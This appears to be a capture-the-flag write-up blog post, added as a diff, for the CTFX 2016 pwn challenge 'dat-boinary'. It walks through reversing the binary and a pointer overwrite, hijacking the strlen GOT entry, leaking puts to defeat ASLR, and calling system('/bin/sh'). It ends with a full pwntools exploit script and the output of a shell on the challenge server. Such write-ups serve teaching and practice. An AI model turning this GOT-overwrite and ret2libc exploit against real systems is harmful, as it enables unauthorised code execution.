@@ -1,0 +1,331 @@
+Title: CTFX - dat-boinary
+Date: 2016-09-04 14:41
+Category: CTF
+Tags: ctf pwn ctfx2016
+Slug: ctfx-dat-boinary
+Authors: wumb0
+
+## Reversing the Binary
+This challenge provided two binaries: `dat-boinary` and `libc.so.6`. Usually this combination requires you to leak memory, calculate offsets, and call `system` or an `exec` function from libc. With that in mind I jumped right in to reversing with radare2.
+
+The first block of main allocates a dynamic buffer of size 0x80 with `malloc` and gets a "meme id" of up to 9 bytes that is stored in ebp-0x20. The next block provides five menu options: update the meme id, update the meme dankness, update meme content, print meme contents, and the super secret meme option. The first 4 are pretty straight forward, while the last is not so much. 
+
+Stack locations of interest are:
+
+- ebp-0xc - location of menu choice (4 bytes)
+
+- ebp-0x10 - Temporary storage for the dankness of the meme (4 bytes)
+
+- ebp-0x14 - `malloc`ed buffer for meme content - (4 byte pointer)
+
+- ebp-0x18 - Meme dankness if the temporary dankness is greater than 0x7f (4 byte pointer)
+
+- ebp-0x20 - meme id location (8 bytes)
+
+After some trial and error in gdb I noticed that the initial `fgets` for the id of the meme takes 9 characters instead of the provided 8. This would prove useful later.
+
+Setting the meme id itself used the length of the preexisting id to know how much to read from the user. This will also be useful, because as long as null bytes in the meme dankness can be avoided then the pointer to the `malloc`ed buffer can be overwritten and arbitrary write can be achieved. The only issue here is that this bug can only be triggered once without somehow making strlen return more than the actual strlen of the buffer. Again, that's a task for after investigation.
+
+Setting the dankness involved reading in a number, checking if it was over 0x7f and then not moving it into the meme dankness memory location if it was over. This is a problem because the meme dankness is directly before the pointer that I wanted to overwrite. 
+
+The update content does exactly what one would expect, but with one additional check. It uses `fgets` to read into the buffer allocated by malloc. The number of bytes it reads is the dankness number. Before anything is read it checks if the dankness is over 0x80, because that would cause a buffer overflow.
+
+Print contents is also straight forward; it prints the content of the meme with a proper call to `printf`.
+
+Finally, the secret meme function is passed the meme id buffer and then calls `secret_meme`. The `secret_meme` function sets meme id + 8 to 0x69696969 and prints something...
+
+```none
+here come dat boi
+      ,++++
+       ###+.
+        #+++
+        ++++
+      +++++++
+   ;+#, ++++'
+ ,#`    +++++
+        +###'
+        +###+'
+      +##'#++
+      .#:+++#+
+      ++  ;  +
+       +` ;  +
+        +;; ++
+       `##;#++
+       #:';`+:
+      ;'`:;:+;
+      #``:;:+#
+      # `+;':#
+      #: ;'';#
+      #.`.;+`:
+      ';::;'#
+       #.:'#'
+        #+#;    o shit whaddup!
+sh
+
+it's
+
+a
+
+secret
+```
+All I can really say to that is **oh shit, whaddup?**
+
+Nice. The important thing here is that meme id + 8 is the meme dankness. So before there was no way to set the meme dankness (located right before the content pointer) to anything above 0x7f leaving null bytes, which would terminate the strlen call too early for the overwrite to happen.
+
+## Pointer Overwrite
+Loading the binary up in gdb I was able to test this overwrite theory. My plan of attack was:
+
+1. Set the meme id to a string of length 9 to stop it from writing a null byte
+
+2. Run the `secret_meme` function to set the dankness to 0x69696969
+
+3. Run the update id function providing 0xc bytes of junk data and then the pointer (0x41414141 for now)
+
+Success!
+
+# Overcoming a null byte
+Unfortunately the last byte of the id buffer was set to null and there was no way to unset it. This is where I got clever: what if I could make `strlen` always return a number high enough to allow the overwrite? Searching ROP gadgets in radare2 turned up one: 
+
+```
+0x08048567                 91  xchg eax, ecx
+0x08048568               0408  add al, 8
+0x0804856a               01c9  add ecx, ecx
+0x0804856c               f3c3  ret
+```
+
+To make sure this would be okay I examined the contents of EAX and ECX when strlen is called in main:
+```
+eax            0xffffda88       0xffffda88
+ecx            0x11             0x11
+```
+
+EAX is a temporary register and will hold the number of bytes to read and ECX just always seem to be 0x11 when this call is made. Furthermore, playing around with the value of ECX for after the function call resulted in no crashes, so this seemed like a good solution.
+
+To cause the overwrite I had to set the pointer (previously set to 0x41414141 above) to the address of `got.strlen`, change the dankness to 5 to allow 4 bytes of overwrite (`fgets` accounts for the null), and then write the address of the meme content.
+
+I decided to use pwntools for this:
+```python
+e = ELF('./dat-boinary')
+r = process(e.path)
+
+strlen_replace = 0x08048567
+gdb.attach(r, "b * 0x0804889d")
+sleep(3)
+
+r.sendline(cyclic(9))
+log.info("buffer maxed out")
+
+r.sendline("5")
+log.info("called secret meme")
+
+r.sendline("1")
+r.sendline(cyclic(0xc) + p32(e.sym['got.strlen']) + cyclic(10))
+log.info("meme content should be addr of strlen")
+
+r.sendline("2")
+r.sendline("5")
+log.info("set dankness to 5")
+
+r.sendline("3")
+r.sendline(p32(strlen_replace))
+log.info("strlen replaced")
+
+r.sendline("1")
+r.sendline(cyclic(100))
+```
+
+Running this and stepping though each command sent showed that the GOT entry for `strlen` was overwritten with the address of the gadget:
+```none
+> x/x &'strlen@got.plt'
+0x8049120 <strlen@got.plt>:     0x08048567
+```
+
+Trying to set the meme id again (with cyclic(100)) caused another overwrite:
+```none
+> x/8x $esp
+0xffb136a0:     0xffb13cc9      0x0000002f      0x61616161      0x00616162
+0xffb136b0:     0x61616163      0x61616164      0x61616165      0x00000000
+```
+
+So now I was able to write anything anywhere repeatedly.
+
+## Leaking Puts
+
+Because ASLR was enabled for this challenge I needed to leak an address of a libc function before I could call `system` to get a shell. Leaking `puts` seemed like an obvious choice. This would be done with the help of the print meme content function. All I needed to do was set the meme to the address of `puts`, print it, and then capture the first four bytes. Those first four bytes would be the ascii representation of the hex address of puts inside of libc. To calculate the offset to `system` all I had to do was use pwntools to rebase the libc binary and then reference `system` from the libc binary symbols. All of this is accomplished with the following python snippet:
+```python
+r.sendline("1")
+r.sendline(cyclic(0xc) + p32(e.sym['got.puts']) + cyclic(10))
+log.info("meme is now the address of puts")
+r.recvrepeat(1)
+
+r.sendline("4")
+r.recvuntil("c0nT3nT:")
+r.recv(1) #tab
+leaked_puts = u32(r.recv(4))
+
+libc.address = leaked_puts - libc.symbols["puts"]
+r.recv(1024)
+log.success("leaked puts: " + hex(leaked_puts) + ", system: " + hex(libc.symbols['system']))
+```
+
+The resulting output is promising:
+```none
+[*] meme is now the address of puts
+[+] leaked puts: 0xf75a37e0, system: 0xf757e310
+```
+
+Checking this in the debugger confirmed that this was working correctly:
+```none
+> p system
+$1 = {<text variable, no debug info>} 0xf757e310 <system>
+```
+
+I was ready to get the flag!
+
+
+## Flag Captured
+Since the meme id was being read in using `fread` and not `fgets` I was able to put the /bin/sh string right at the beginning of the meme id while still being able to set the GOT entry for `strlen` to the leaked `system` address. I chose `strlen` here because it is run on command and has the meme id buffer as its only argument. I followed the following steps to make this work:
+
+1. Set the meme id to [/bin/sh\x00][0xc-8 bytes junk][address of strlen GOT entry][10 bytes extra to satisfy the read]
+2. Set the meme dankness back to 5 in order to overwrite the meme content
+3. Overwrite the `strlen` GOT entry with the leaked and calculated `system` address
+4. Set the meme id to trigger system instead of strlen with /bin/sh in the buffer passed as an argument
+5. Get the flag :)
+
+The full code for the end of this exploit can be seen at the bottom of this post. Running the script on the remote host resulted in the flag!
+```shell
+→ python boinary.py REMOTE
+[*] '/home/vagrant/CTF/ctfx/dat-boinary'
+    Arch:     i386-32-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE
+[*] '/home/vagrant/CTF/ctfx/libc.so.6'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to problems.ctfx.io on port 1337: Done
+[*] buffer maxed out
+[*] called secret meme
+[*] meme content should be addr of strlen
+[*] set dankness to 5
+[*] strlen replaced
+[*] meme is now the address of puts
+[+] leaked puts: 0xf75f4da0, system: 0xf75ce3e0
+[*] set meme to strlen
+[*] set dankness to 5
+[*] set strlen to system
+[*] trying shell
+[+] got shell
+[+] Flag: ctf(0n1y_th3_fr35h35t_m3m3s)
+```
+
+Gottem: **ctf(0n1y_th3_fr35h35t_m3m3s)**
+
+## Full script
+probably upload to github gists
+
+```python
+from pwn import *
+from time import sleep
+
+e = ELF('./dat-boinary')
+libc = ELF(args.get('LIBC', './libc.so.6'))
+
+if args.get('REMOTE'):
+    r = remote("problems.ctfx.io", 1337)
+else:
+    r = process(e.path)
+
+strlen_replace = 0x08048567
+'''
+0x08048567                 91  xchg eax, ecx
+0x08048568               0408  add al, 8
+0x0804856a               01c9  add ecx, ecx
+0x0804856c               f3c3  ret
+'''
+
+if not args.get("REMOTE"):
+    gdb.attach(r, "b * 0x0804889d")
+    sleep(3)
+
+# max out the id buffer so we can overwrite past it later
+r.sendline(cyclic(9))
+r.recv(1024)
+log.info("buffer maxed out")
+
+# set id buffer+8 to 0x69696969 to clear nulls so we can overwrite meme content addr
+r.sendline("5")
+r.recv(1024)
+log.info("called secret meme")
+
+# set meme content addr to strlen
+r.sendline("1")
+r.sendline(cyclic(0xc) + p32(e.sym['got.strlen']) + cyclic(10))
+r.recv(1024)
+log.info("meme content should be addr of strlen")
+
+# set dankness back to a reasonable # so that we can write content to the meme
+r.sendline("2")
+r.sendline("5")
+r.recv(1024)
+log.info("set dankness to 5")
+
+# overwrite strlen with our gadget that ignores nulls
+r.sendline("3")
+r.sendline(p32(strlen_replace))
+r.recv(1024)
+log.info("strlen replaced")
+
+# set meme content addr to puts
+r.sendline("1")
+r.sendline(cyclic(0xc) + p32(e.sym['got.puts']) + cyclic(10))
+r.recv(1024)
+log.info("meme is now the address of puts")
+
+# leak the address of puts... I guess I could have just done strlen. Oh well
+r.sendline("4")
+r.recvuntil("c0nT3nT:")
+r.recv(1) #tab
+leaked_puts = u32(r.recv(4))
+
+# rebase libc on leaked puts addr
+libc.address = leaked_puts - libc.symbols["puts"]
+r.recv(1024)
+log.success("leaked puts: " + hex(leaked_puts) + ", system: " + hex(libc.symbols['system']))
+
+# read in /bin/sh to id and also set the meme content addr to strlen
+r.sendline("1")
+r.sendline("/bin/sh\x00" + cyclic(0xc-8) + p32(e.sym['got.strlen']) + cyclic(20))
+r.recv(1024)
+log.info("set meme to strlen")
+
+# to set content (overwrite strlen with system) set the dankness back to 11 :)
+r.sendline("2")
+r.sendline("5")
+r.recv(1024)
+log.info("set dankness to 5")
+
+# overwrite strlen with system
+r.sendline("3")
+r.sendline(p32(libc.symbols['system']))
+r.recv(1024)
+log.info("set strlen to system")
+
+# call dat bad boiiii
+r.sendline("1")
+r.recvuntil("ur m3m3 id")
+
+# enjoy dat shell boi ;)
+r.sendline("id")
+log.info("trying shell")
+if "uid=" in r.recvrepeat(2):
+    log.success("got shell")
+    r.sendline("cat flag.txt")
+    log.success("Flag: " + r.recv(1024))
+else:
+    log.error("failed to get shell")
+```
